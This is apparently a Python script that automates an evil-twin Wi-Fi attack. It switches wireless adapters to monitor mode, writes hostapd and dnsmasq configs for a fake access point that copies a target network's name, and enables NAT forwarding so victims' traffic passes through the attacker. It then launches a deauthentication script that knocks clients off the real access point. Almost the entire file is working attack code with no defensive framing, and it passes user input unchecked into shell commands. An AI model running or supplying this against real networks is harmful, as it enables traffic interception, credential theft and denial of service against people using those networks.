import os
import subprocess
import time


def change2monitor(interface):
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')


if __name__ == '__main__':
    ##------------------------ step 1 monitor mode -------------------------------------------------##
    os.system('iwconfig')
    monitor_interface1 = input("enter the first wireless adapter’s name to insert to monitor mode")
    monitor_interface2 = input("enter the second wireless adapter’s name to insert to monitor mode")
    change2monitor(monitor_interface2)
    change2monitor(monitor_interface1)
    os.system('iwconfig')
    time.sleep(5)
    ##------------------------ step 2 scan sets -----------------------------------------------------##
    os.system("gnome-terminal -x python2 netStats.py")
    target_AP_name = input("enter the fake AP name")
    target_AP_BSSID = input("enter the fake AP BSSID")
    ##------------------------ step 3 create fake access point ---------------------------------------##

    hostapdPath = os.path.join('/root/fap', 'hostapd.conf')
    if not os.path.exists('/root/fap'):
        os.makedirs('/root/fap')
    f = open(hostapdPath, "w")
    f.write("interface=" + monitor_interface2 + "\ndriver=nl80211\nssid=" + target_AP_name + "\nhw_mode=g"
                                       "\nchannel=11\nmacaddr_acl=0\nignore_broadcast_ssid=0")
    f.close()

    os.system("gnome-terminal -x python3 run_fake_net.py")
    time.sleep(5)
    ##------------------------ step 4 DHCP server ---------------------------------------##
    dnsmasqPath = os.path.join('/root/fap', 'dnsmasq.conf')
    if not os.path.exists('/root/fap'):
        os.makedirs('/root/fap')
    f = open(dnsmasqPath, "w")
    f.write("interface=" + monitor_interface2 + "\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n"
                        "dhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\n"
                        "log-queries\nlog-dhcp\nlisten-address=127.0.0.1")
    f.close()
    os.system('sudo killall -9 dnsmasq')
    os.system('ifconfig ' + monitor_interface2 + ' up 192.168.1.1 netmask 255.255.255.0')
    os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')

    os.system("gnome-terminal -x python3 run_DHCP_server.py")

    ##------------------------ step 5 iptables ---------------------------------------##
    os.system('iwconfig')
    internet_connection = input("enter name of the virtual wireless adapter that is connected to the internet")
    os.system('iptables --table nat --append POSTROUTING --out-interface ' + internet_connection + ' -j MASQUERADE')
    os.system('iptables --append FORWARD --in-interface ' + monitor_interface2 + ' -j ACCEPT')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    ##------------------------ step 6 deauthentication ---------------------------------------##
    os.system("gnome-terminal -x python3 my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
    # os.system("python3 my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)

    while True:
        time.sleep(5)